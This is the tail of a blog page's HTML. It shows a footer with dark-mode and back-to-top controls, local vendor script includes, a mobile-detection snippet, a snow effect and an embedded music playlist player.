                    <div class="box theme-box" id="darkmode-switch">
                        <span class="fa fa-adjust"></span>
                    </div>
                
                
            </div>
            <div class="box gotop-box">
                <span class="fa fa-chevron-up"></span>
            </div>
        </div>
    </div>
</footer>
</div>
</div>


        <script defer src="/vendors/bootstrap@3.3.4/dist/js/bootstrap.min.js"></script>
<script defer src="/vendors/nprogress@0.2.0/nprogress.js"></script>
<script>
    if (!window.kr) {
        window.kr = {};
    }
    window.kr.notMobile = (!(navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i)));
    window.kr.siteRoot = "/";
</script>

    <div>
        <canvas id="snow"></canvas>
        <script async src="/js/snow.min.js"></script>
    </div>


    <script async src="/js/candy.min.js"></script>



    <script defer src="/vendors/aplayer@1.10.1/dist/APlayer.min.js"></script>
    
    <script defer src="/vendors/meting@2.0.1/dist/Meting.min.js"></script>
    <meting-js
        server="netease"
        type="playlist"
        id="7733928587"
        order="random"
        fixed="true"
    >
    </meting-js>



    <script defer src="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>

<script defer src="/vendors/clipboard@2.0.6/dist/clipboard.min.js"></script>
<script defer src="/js/kratosr.min.js"></script>
<script defer src="/js/pjax.min.js"></script>

    <script defer src="/vendors/layui-src@2.5.5/dist/layui.all.js"></script>



<!-- Extra support for third-party plguins  -->



    </body>
</html>